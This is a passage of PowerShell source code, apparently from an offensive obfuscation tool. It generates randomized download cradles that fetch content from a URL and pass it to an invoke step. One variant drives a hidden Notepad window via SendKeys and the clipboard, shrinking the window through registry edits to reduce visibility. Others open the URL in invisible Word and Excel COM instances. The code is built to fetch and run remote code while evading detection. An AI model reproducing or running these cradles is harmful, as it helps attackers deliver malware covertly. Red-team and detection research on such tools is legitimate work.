                        $iWindowPosX  =  $iWindowPosX.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $iWindowPosY  =  $iWindowPosY.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $StatusBar    =    $StatusBar.Replace($GetItemPropertyTag,$GetItemProperty.Replace($ModuleAutoLoadTag,''))
                        $AppActivate  =  $AppActivate.Replace($WScriptShellTag,$GetVar4)
                        $SendKeys     =     $SendKeys.Replace($WScriptShellTag,$GetVar4)
                        $GetText      =      $GetText.Replace($WindowsFormsClipboardTag,"[$WindowsFormsClipboard]")
                        $Exec         =         $Exec.Replace($WScriptShellTag,$GetVar4)
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2'$SendKeysApp'"
                        $CommandArray += "$SetVar8'HKCU:\Software\Microsoft\Notepad'"

                        If(!$HasModuleAutoLoadCommand -AND $NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $NewObject = $NewObject.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar4($NewObject$ComObjectFlag WScript.Shell)"

                        If(!$HasModuleAutoLoadCommand -AND $GetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($GetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $GetItemProperty = $GetItemProperty.Replace($ModuleAutoLoadTag,'')
                        $CommandArray += $CurrentModuleAutoLoadRandom + "$SetVar5($GetItemProperty$GetVar8)"

                        $CommandArray += ("$ReflectionAssembly::" + $LoadWithPartialName.Replace($ReflectionAssemblyTag,$ReflectionAssembly.Replace('[Void]','').Replace('$Null=','')) + "('System.Windows.Forms')")

                        If(!$HasModuleAutoLoadCommand -AND $SetItemProperty.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($SetItemProperty.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                            $HasModuleAutoLoadCommand = $TRUE
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $SetItemProperty = $SetItemProperty.Replace($ModuleAutoLoadTag,'')

                        # Set Notepad's properties (namely sizing and status bar configurations) to reduce visibility and potential noise.
                        # Randomize the order of these properties.
                        $SetItemListTemp = @(@("'$StatusBar'",0),@("'$iWindowPosY'","([String]($WindowsFormsScreen::AllScreens)).$ScreenHeight"))
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_01)
                        {
                            $SetItemList += , $SetItemListTemp[$Index]
                        }

                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $SetItemPropValue;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemArray in $SetItemList)
                            {
                                $SetItemPropName  = $SetItemArray[0]
                                $SetItemPropValue = $SetItemArray[1]

                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }
                                      
                                $SetItemPropNameTrimmed += "@($SetItemPropName,$SetItemPropValue)"
                            }
                              
                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable[0] $CurrentItemVariable2[1]}"
                        }
                        $CommandArray += $SetItemSyntax

                        # Since 'Notepad - Untitled' application title is language specific (and we need this to perform AppActivate checks for higher reliability on slower systems), we will query MainWindowTitle from Notepad instance that we launch.
                        # This will also reduce the likelihood of errors if additional Notepad windows are already present.
                        $CommandArray += "$SetVar7$GetVar4.$Exec($GetVar2).ProcessID"
                        $CommandArray += "$SetVar3`$Null;While(!($GetVar3)){$SetVar3($GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}|$ForEachRandom{$CurrentItemVariable2.MainWindowTitle});$SleepMilliseconds}"
                        $CommandArray += "While(!$GetVar4.$AppActivate($GetVar3)){$SleepMilliseconds}"
                          
                        # The below ^o (Open) shortcut does not appear to be language dependent.
                        # If there are scenarios in which it is then we can switch to: '%','{ENTER}','{DOWN}','{ENTER}'
                        $CommandArray += "$GetVar4.$SendKeys('^o')"
                        $CommandArray += $SleepMilliseconds
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @($GetVar1,"(' '*1000)","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax
                        $CommandArray += "$SetVar6`$Null"
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'^a'","'^c'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "While($GetVar6.Length$LessThanTwoRandom){[$WindowsFormsClipboard]::$ClearClipboard;$SendKeysSyntax;$SleepMilliseconds;$SetVar6([$WindowsFormsClipboard]::$GetText)}"
                        $CommandArray += "[$WindowsFormsClipboard]::$ClearClipboard"

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'%f'","'x'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable2)}"
                        }
                        $CommandArray += $SendKeysSyntax

                        # Randomly decide between piped and not-piped syntax for multiple contiguous SendKeys commands.
                        $SendKeysList = @("'{TAB}'","'$SendKeysEnter'")
                        $SendKeysSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SendKey in $SendKeysList)
                            {
                                $SendKeysSyntax += "$GetVar4.$SendKeys($SendKey);"
                            }
                            $SendKeysSyntax = $SendKeysSyntax.Trim(';')
                        }
                        Else
                        {
                            $SendKeysSyntax = "@(" + ($SendKeysList -Join ',') + ")|$ForEachRandom{$GetVar4.$SendKeys($CurrentItemVariable)}"
                        }
                        $CommandArray += "If($GetProcessRandom|$WhereObjectRandom{$CurrentItemVariable.id$EqualFlagRandom$GetVar7}){$SendKeysSyntax}"

                        # Set Notepad's properties (namely sizing and status bar configurations) back to pre-download state stored in propertiy variable ($GetVar5).
                        # Randomize the order of these properties.
                        $SetItemListTemp = @("'$iWindowPosDX'","'$iWindowPosDY'","'$iWindowPosX'","'$iWindowPosY'","'$StatusBar'")
                        $SetItemList = @()
                        ForEach($Index in $SetItemListIndex_012345)
                        {
                            $SetItemList += $SetItemListTemp[$Index]
                        }
                          
                        # Randomly decide between piped and not-piped syntax for multiple contiguous Set-ItemProperty commands.
                        $SetItemSyntax = ''
                        If($SwitchRandom_01 -eq 0)
                        {
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Remove single quotes from $SetItemPropName for all usages in this If block.
                                $SetItemPropName = $SetItemPropName.Trim("'")

                                # Encapsulate with parentheses for $SetItemPropName2 if it ends with .Value.
                                $SetItemPropName2 = $SetItemPropName
                                If($SetItemPropName2.EndsWith(').Value'))
                                {
                                    $SetItemPropName2 = "($SetItemPropName2)"
                                }
                                  
                                $SetItemSyntax += "$SetItemProperty$GetVar8 $SetItemPropName $GetVar5.$SetItemPropName2;"
                            }
                            $SetItemSyntax = $SetItemSyntax.Trim(';')
                        }
                        Else
                        {
                            $SetItemPropNameTrimmed = @()
                            ForEach($SetItemPropName in $SetItemList)
                            {
                                # Trim off single quotes for variables.
                                If($SetItemPropName.Contains('('))
                                {
                                    $SetItemPropName = $SetItemPropName.Trim("'")
                                }

                                $SetItemPropNameTrimmed += $SetItemPropName
                            }
                              
                            # Encapsulate with parentheses for $CurrentItemVariable2ForSetItemSyntax if it ends with .Value.
                            $CurrentItemVariable2ForSetItemSyntax = $CurrentItemVariable2
                            If($CurrentItemVariable2ForSetItemSyntax.EndsWith(').Value'))
                            {
                                $CurrentItemVariable2ForSetItemSyntax = "($CurrentItemVariable2ForSetItemSyntax)"
                            }

                            $SetItemSyntax = "@(" + ($SetItemPropNameTrimmed -Join ',') + ")|$ForEachRandom{$SetItemProperty$GetVar8 $CurrentItemVariable $GetVar5.$CurrentItemVariable2ForSetItemSyntax}"
                        }
                        $CommandArray += $SetItemSyntax

                        $SyntaxToInvoke = $GetVar6

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_0123] + $CommandArray[$ArrayIndexOrder_45] + $CommandArray[6..$CommandArray.Length])  -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        11 {
            ################################################
            ## PSCOMWORD - COM Object With Microsoft Word ##
            ################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comWord' # Word COM Object
                    $RandomVarName2 = 'doc'     # Document

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','Visible2','BooleanFalse','Sleep','Busy','Documents','Open','Content','Text')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Visible2  =  $Visible2.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Documents = $Documents.Replace($VarTag1,$GetVar1)
                        $Content   =   $Content.Replace($VarTag2,$GetVar2)
                        $Text      =      $Text.Replace($VarTag2,$GetVar2).Replace($ContentTag,$Content)
                        $Open      =      $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Documents)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Word.Application"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible2=$BooleanFalse"
                        $CommandArray += "$SetVar2$GetVar1.$Documents.$Open('$Url')"
                          
                        $SyntaxToInvoke = "$GetVar2.$Content.$Text"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','Visible2','BooleanFalse','Sleep','Busy','Documents','Open','Content','Text')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Visible2  =  $Visible2.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Documents = $Documents.Replace($VarTag1,$GetVar1)
                        $Content   =   $Content.Replace($VarTag2,$GetVar2)
                        $Text      =      $Text.Replace($VarTag2,$GetVar2).Replace($ContentTag,$Content)
                        $Open      =      $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Documents)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Word.Application)"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible2=$BooleanFalse"
                        $CommandArray += "$SetVar2$GetVar1.$Documents.$Open('$Url')"
                          
                        $SyntaxToInvoke = "$GetVar2.$Content.$Text"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                          
                        $CommandArray2 += "$SetVar1`Word.Application"

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag $GetVar1)"
                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible2=$BooleanFalse"
                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$SetVar2$GetVar1.$Documents.$Open($GetVar2)"
                          
                        $SyntaxToInvoke = "$GetVar2.$Content.$Text"

                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray2 += "$GetVar1.Quit()"
                        $CommandArray2 += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray -Join ';')}
                            2 {$Syntax = (($CommandArray2[$Array2IndexOrder_0123] + $CommandArray2[4,5,6,7,8]) -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        } 
        12 {
            ##################################################
            ## PSCOMEXCEL - COM Object With Microsoft Excel ##
            ##################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comExcel' # Excel COM Object

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 1
                          
                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','BooleanFalse','DisplayAlerts','Workbooks','Open','Sleep','Busy','JoinNewline','Newline','Sheets','Item','Range','UsedRange','Rows','Count','ValueOrFormula')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $DisplayAlerts  =  $DisplayAlerts.Replace($VarTag1,$GetVar1)
                        $Busy           =           $Busy.Replace($VarTag1,$GetVar1)
                        $Workbooks      =      $Workbooks.Replace($VarTag1,$GetVar1)
                        $Sheets         =         $Sheets.Replace($VarTag1,$GetVar1)
                        $Open           =           $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Workbooks)
                        $Item           =           $Item.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets)
                        $Range          =          $Range.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $UsedRange      =      $UsedRange.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $Rows           =           $Rows.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange)
                        $Count          =          $Count.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)
                        $ValueOrFormula = $ValueOrFormula.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Excel.Application"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$DisplayAlerts=$BooleanFalse"
                        $CommandArray += "`$Null=$GetVar1.$WorkBooks.$Open('$Url')"

                        $SyntaxToInvoke = $JoinNewLine.Replace($NewLineTag,$NewLine).Replace($JoinNewLineTag,"($GetVar1.$Sheets.$Item(1).$Range(`"A1:$MZRandom`"+$GetVar1.$Sheets.$Item(1).$UsedRange.$Rows.$Count).$ValueOrFormula|$WhereObjectRandom{$CurrentItemVariable})")
                              
                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                          
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 1
                          
                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','RuntimeInteropServicesMarshal','BooleanFalse','DisplayAlerts','Workbooks','Open','Sleep','Busy','JoinNewline','Newline','Sheets','Item','Range','UsedRange','Rows','Count','ValueOrFormula')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                  
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $DisplayAlerts  =  $DisplayAlerts.Replace($VarTag1,$GetVar1)
                        $Busy           =           $Busy.Replace($VarTag1,$GetVar1)
                        $Workbooks      =      $Workbooks.Replace($VarTag1,$GetVar1)
                        $Sheets         =         $Sheets.Replace($VarTag1,$GetVar1)
                        $Open           =           $Open.Replace($VarTag1,$GetVar1).Replace($ComMemberTag,$Workbooks)
                        $Item           =           $Item.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets)
                        $Range          =          $Range.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $UsedRange      =      $UsedRange.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item)
                        $Rows           =           $Rows.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange)
                        $Count          =          $Count.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)
                        $ValueOrFormula = $ValueOrFormula.Replace($VarTag1,$GetVar1).Replace($SheetsTag,$Sheets).Replace($ItemTag,$Item).Replace($UsedRangeTag,$UsedRange).Replace($RowsTag,$Rows)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag Excel.Application" + ')'

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$DisplayAlerts=$BooleanFalse"
                        $CommandArray += "`$Null=$GetVar1.$WorkBooks.$Open('$Url')"

                        $SyntaxToInvoke = $JoinNewLine.Replace($NewLineTag,$NewLine).Replace($JoinNewLineTag,"($GetVar1.$Sheets.$Item(1).$Range(`"A1:$MZRandom`"+$GetVar1.$Sheets.$Item(1).$UsedRange.$Rows.$Count).$ValueOrFormula|$WhereObjectRandom{$CurrentItemVariable})")

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
